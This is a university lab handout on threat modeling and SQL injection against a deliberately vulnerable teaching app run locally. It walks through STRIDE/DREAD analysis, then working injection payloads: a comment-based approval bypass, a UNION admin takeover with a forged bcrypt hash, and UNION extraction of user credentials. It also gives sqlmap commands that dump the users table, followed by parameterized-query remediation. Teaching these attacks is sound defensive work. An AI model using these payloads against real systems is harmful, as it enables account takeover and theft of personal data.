# Week 8 Lab — SQL Injection and OWASP Top 10

**Lecture:** Threat Modeling, STRIDE, and DREAD; OWASP Top 10 and SQL Injection

---

## Overview

SQL injection is present in the login form, the grades search endpoint, and the enrollment search endpoint. This week you will apply STRIDE and DREAD to formally model the threat landscape, then exploit each injection point using manual payloads and sqlmap. You will remediate all injection points with parameterized queries and verify the fix.

---

## Tools

| Tool | Purpose |
|------|---------|
| Browser / Burp Suite | Manual injection testing |
| sqlmap | Automated SQL injection discovery and exploitation |
| MySQL CLI | Verify database state and confirm exploitation results |
| Flask source code | Implement parameterized query remediation |

### Installing sqlmap by Platform

**macOS:**
```bash
brew install sqlmap
# or
pip3 install sqlmap
```

**Linux:**
```bash
pip3 install sqlmap
# or
sudo apt install sqlmap
```

**Windows:**
```powershell
pip install sqlmap
```

> After installation, verify with `sqlmap --version`. On Windows, if `sqlmap` is not found after install, try `python -m sqlmap --version` or run it via Git Bash.

---

## Steps

Use your cumulative HuskyHub application from Weeks 3–7, including the AI fixes, bcrypt, signed sessions, logging, and authorization.

### 1. Complete a STRIDE Threat Model

**What STRIDE is and how to use it:**
STRIDE is a threat modeling framework developed by Microsoft that organizes threats into six categories: Spoofing (impersonating someone else), Tampering (modifying data or code), Repudiation (denying you performed an action), Information Disclosure (exposing data to unauthorized parties), Denial of Service (making the system unavailable), and Elevation of Privilege (gaining access beyond your authorization level). You apply STRIDE systematically to each component of the system architecture, asking "how could an attacker achieve this threat category against this component?" The value is comprehensiveness: you are forced to consider every category rather than just the vulnerabilities that happen to be most familiar.

Using the application architecture (nginx, Flask, MySQL, AI chatbot), complete a STRIDE analysis. For each of the six categories, identify at least one threat per major component.

Format as a table:

| Component | Spoofing | Tampering | Repudiation | Info Disclosure | DoS | Elevation of Privilege |
|-----------|----------|-----------|-------------|----------------|-----|------------------------|
| nginx | ... | ... | ... | ... | ... | ... |
| Flask app | ... | ... | ... | ... | ... | ... |
| MySQL | ... | ... | ... | ... | ... | ... |
| AI chatbot | ... | ... | ... | ... | ... | ... |

---

### 2. Score Your Top Threats with DREAD

**What DREAD scoring produces and how to use the output:**
DREAD scores each threat across five dimensions to produce a numerical priority ranking. The purpose is not false precision — a score of 12 is not meaningfully different from 11 — but forcing a structured comparison between threats so you can make a defensible argument for which ones to fix first. In a real organization, security remediation competes with feature development for engineering time. A DREAD-scored threat model gives a security team language to justify prioritization to non-technical stakeholders.

Select the five highest-priority threats from your STRIDE table. Score each using DREAD:

| Dimension | Score 1 | Score 2 | Score 3 |
|-----------|---------|---------|---------|
| **D**amage | Minimal | Individual/limited | Catastrophic/many users |
| **R**eproducibility | Difficult | Repeatable with effort | Trivially reproducible |
| **E**xploitability | Expert only | Some skill required | No skill required |
| **A**ffected Users | Few | Many | All |
| **D**iscoverability | Hard to find | Findable with research | Obvious |

Rank by total score. This ranking should inform which vulnerabilities you fix first.

---

### 3. Break the Login with SQL Injection

**Why the obvious payload no longer works:**
In earlier, standalone versions of this app the login compared the password *inside* the SQL query and identity came from a forgeable cookie, so a single tautology logged you straight in. Your cumulative app is different. After Week 4, `auth.py` retrieves the account by username and verifies the password with **bcrypt in Python**; after Week 6 it also enforces lockout and issues a **signed** session built from the retrieved row. So a bare tautology now returns a row but bcrypt still rejects an arbitrary password — you just get the generic error. That does **not** mean the login is safe: the query is still assembled with an f-string, and below you break authentication two different ways without ever defeating bcrypt directly.

> **Historical contrast — what used to work.**
> On the earliest version of this lab (before Weeks 4–6), the login looked like
> `SELECT * FROM users WHERE username = '{username}' AND password = '{password}'`,
> the stored passwords were plaintext, and identity came from a plain `user_id`/`role` cookie the client could edit. Against that code:
>
> ```text
> Username:  admin'#
> Password:  (anything)
> ```
>
> commented out the whole password check and logged you in as `admin` with no password at all; `' OR '1'='1' #` did the same by making the `WHERE` clause always true. Those one-liners are exactly what the cumulative hardening in this repo was built to stop. We will bypass authentication in a (slightly) more sophisticated way that still breaks bcrypt and the hardening that we have implemented over the past few weeks.

#### 3a. Bypass the approval gate on an account you control

Registration creates accounts with `approved = 0`, and the login query ends in `AND approved = 1`, so a freshly registered account cannot normally log in.

1. Register a test account — username `tester`, password `test`. Try to log in normally and confirm it is refused (pending approval).
2. Now log in with:
   ```text
   Username:  tester'#
   Password:  test
   ```

The query becomes:
```sql
SELECT * FROM users WHERE username = 'tester'#' AND approved = 1
```
The `#` comments out `AND approved = 1`. Your row is returned, your real password passes bcrypt, and you are logged in to an account no one approved.

Document the result, and note what the injection actually defeated: the **approval** control, not the password check. bcrypt was never challenged, because you used a password you legitimately know.

#### 3b. Take over the admin account with a UNION (advanced)

**The idea:** bcrypt only proves that the submitted password matches the hash *in the row the query returned*. The login runs `SELECT *`, so a `UNION SELECT` lets you **fabricate that row** — including the password hash. Supply a hash of a password *you* generate, and bcrypt will validate your own password while the `role` column you supplied says `admin`. You never need admin's real password.

The `users` table has 11 columns, in this order:
```text
user_id, username, first_name, last_name, email, password, role, approved, failed_attempts, lockout_until, created_at
```

1. Generate a bcrypt hash of a password you choose (here, `test`):
   ```bash
   docker compose exec huskyhub-flask python -c "import bcrypt; print(bcrypt.hashpw(b'test', bcrypt.gensalt()).decode())"
   ```
   Copy the `$2b$...` string it prints.

2. Log in with the fabricated admin row as the username (hash in column 6, `admin` in column 7), and your chosen password:
   ```text
   Username:  ' UNION SELECT 1,'admin','x','x','x@uw.edu','<PASTE_YOUR_HASH>','admin',1,0,NULL,NULL#
   Password:  test
   ```

The query becomes:
```sql
SELECT * FROM users WHERE username = ''
UNION SELECT 1,'admin','x','x','x@uw.edu','<HASH>','admin',1,0,NULL,NULL#' AND approved = 1
```
The empty-username first `SELECT` matches nothing; the UNION contributes your one fabricated row; `#` comments the trailing `' AND approved = 1`. `fetchone()` returns your row, `check_password('test', <HASH>)` is `True`, and the app writes a **signed** `role = admin` session from the row's values.

Document the admin session you obtained

> Harmless side effect: the post-login counter `UPDATE ... WHERE user_id = 1` touches the real admin row's lockout counters. Nothing is destroyed. Do not restore plaintext comparison or unsigned cookies to reproduce the older bypass — the point is that the f-string query alone is enough.

Document actual responses and server-side evidence for both sub-steps. You will obtain further unambiguous injection evidence at the still-vulnerable search endpoints next, and you will confirm both 3a and 3b stop working after you parameterize the login query in Step 8.

---

### 4. Test the Grades Search Endpoint

**What a UNION attack does and why column count matters:**
A UNION attack appends a second SELECT statement to the original query, causing the database to return rows from both queries in a single result set. For UNION to work, both SELECT statements must return the same number of columns with compatible data types. Inspect the current SELECT columns, then use a controlled mismatch to understand why the count matters. Start by trying — `UNION SELECT 1,2,3,4,5,6#` attempts a 6-column UNION. If the column count is wrong, the database returns an error. If it is correct, the database returns your injected row. Once the correct column count is found, you replace the integer placeholders with actual column names from tables you want to read.

Navigate to `/grades` and use the search field. Enter:
```
%') UNION SELECT 1,2,3,4,5,6#
```

If you receive a column count error, adjust the number of fields until the query succeeds. Then use a payload that extracts data:
```
%') UNION SELECT 1,username,1,password,email,role,1 FROM users#
```

Document what data is returned.

---

### 5. Test the Enrollment Search

Navigate to `/enrollment`. In the course name search field, enter:
```
%' OR 1=1#
```

Document whether additional records are returned beyond the current user's enrollments. The `%` character is the SQL wildcard for `LIKE` queries — it is included here because the enrollment search likely uses `LIKE '%search_term%'`, and prepending `%` ensures the injected OR clause appends correctly to the existing query structure.

---

### 6. Use sqlmap — Database Enumeration

**What sqlmap is doing and what each flag instructs it to do:**
sqlmap is an automated SQL injection tool. It probes a target endpoint with a large library of injection payloads, analyzes the responses to determine whether injection is possible, then systematically extracts data once it confirms a vulnerable parameter. `--dbs` instructs sqlmap to enumerate all accessible databases (the equivalent of `SHOW DATABASES` in MySQL). `--batch` suppresses interactive prompts and accepts default answers automatically — necessary for scripted or unattended runs. The `--cookie` flag provides your session cookie so sqlmap sends requests as an authenticated user — without it, the server would redirect to the login page on every request.

Log in as jsmith over HTTPS, copy the current session cookie from Developer Tools, and replace the placeholder below with its full value. Do not submit the cookie in your report. Verify that the same signed session reaches your own grades (student_id=3); Week 7's authorization should reject other students' IDs. Old authenticated/role/user_id cookie examples no longer apply.

Run sqlmap against this remaining search input. Keep the scan on your local app; the quoted ampersand must remain inside the URL:

**macOS / Linux:**
```bash
sqlmap -u "https://localhost/grades?student_id=3&search=info" \
  --cookie="session=<paste-your-current-signed-cookie>" \
  --dbs \
  --batch
```

**Windows (PowerShell):**
```powershell
sqlmap -u "https://localhost/grades?student_id=3&search=info" --cookie="session=<paste-your-current-signed-cookie>" --dbs --batch
```

**Windows (Git Bash):**
```bash
sqlmap -u "https://localhost/grades?student_id=3&search=info" \
  --cookie="session=<paste-your-current-signed-cookie>" \
  --dbs \
  --batch
```

Record actual findings and any failure to reach the authenticated page. Do not classify an unauthenticated redirect as a clean scan.

---

### 7. Use sqlmap — Table and Data Extraction

**macOS / Linux / Git Bash:**
```bash
# List tables
sqlmap -u "https://localhost/grades?student_id=3&search=info" \
  --cookie="session=<paste-your-current-signed-cookie>" \
  -D huskyhub --tables --batch

# Dump users table
sqlmap -u "https://localhost/grades?student_id=3&search=info" \
  --cookie="session=<paste-your-current-signed-cookie>" \
  -D huskyhub -T users --dump --batch
```

Paste the output (redact actual password hash values). Note how many records were exposed.

---

### 8. Remediation — Parameterized Queries

**How parameterized queries prevent injection at the database level:**
In a parameterized query, the SQL statement structure is sent to the database engine as a separate step from the data values. The `%s` placeholder is a slot in the query template. `cursor.execute(query, (username,))` lets the driver bind the value with the appropriate escaping/type conversion, treating it as data rather than concatenating user text into SQL syntax. Connector implementations differ: this ordinary mysql-connector cursor need not use server-side prepared statements. The exercise is to stop interpolating untrusted values yourself; identifiers such as table names still require fixed choices rather than value placeholders.

Replace every raw string-formatted SQL query in the application with parameterized queries.

**Before (vulnerable):**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**After (safe):**
```python
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

Apply this change to every input-dependent query in auth.py, grades.py, enrollment.py, messages.py, documents.py, admin.py, and chatbot.py, including the lockout updates you wrote in Week 6. Leave already constant queries constant. Keep bcrypt verification, account approval, signed sessions, logging, and authorization intact. LIKE patterns should be bound as values (build the wildcard pattern as data, not by interpolating it into SQL).

Keep the Week 3 AI context, document-wrapper, and template fixes while changing chatbot queries. Rerun its provided tests after rebuilding, using the commands in [Week 3](../week-03/README.md#9-run-the-provided-automated-tests).

---

### 9. Verify the Remediation

Repeat Steps 3–5 against the hardened application. Paste the sqlmap output showing that injection is no longer possible. Confirm crafted usernames do not alter lookup semantics, and that ordinary approved login, registration/approval, lockout, grades search, enrollment, messages, documents, and advisor/admin actions still work. SQL parameterization does not fix missing ownership checks or HTML encoding by itself. Use fresh sqlmap results rather than cached findings (flush its session for the remediation run).

---

## Write-Up Questions

**Q1.** In Step 3b you logged in as admin even though bcrypt was still running. In your own words, explain why bcrypt did not stop you. Where did the password hash it checked actually come from? Then name one change to the login code that would have stopped the attack.

**Q2.** Explain how a parameterized query prevents SQL injection at a technical level. Why does escaping input without parameterization (e.g., `real_escape_string`) fail to provide equivalent protection?

**Q3.** Map the vulnerabilities you have found across all labs so far (Weeks 1–8) to the OWASP Top 10. For each applicable category, identify the OWASP entry and the corresponding HuskyHub vulnerability.

---

## Hacker Mindset Prompt

SQL injection has existed for over 25 years and remains in the OWASP Top 10 because it keeps appearing in production systems. The 2023 MOVEit breach, affecting thousands of organizations globally, was a SQL injection vulnerability.

Reflect on:

- **Contrarian:** sqlmap found the vulnerability and dumped the database in minutes. What does this say about the asymmetry between how long it takes to introduce a vulnerability and how long it takes to exploit it?
- **Committed:** An attacker who dumps the users table via SQL injection has credentials and personal data. Describe the complete attack chain that follows: what do they do next, and what other systems might be affected beyond HuskyHub?
- **Creative:** The database user in HuskyHub has read and write access to all tables. If you were designing the database access policy from scratch, how would you apply the principle of least privilege to reduce the damage a SQL injection attack could cause?
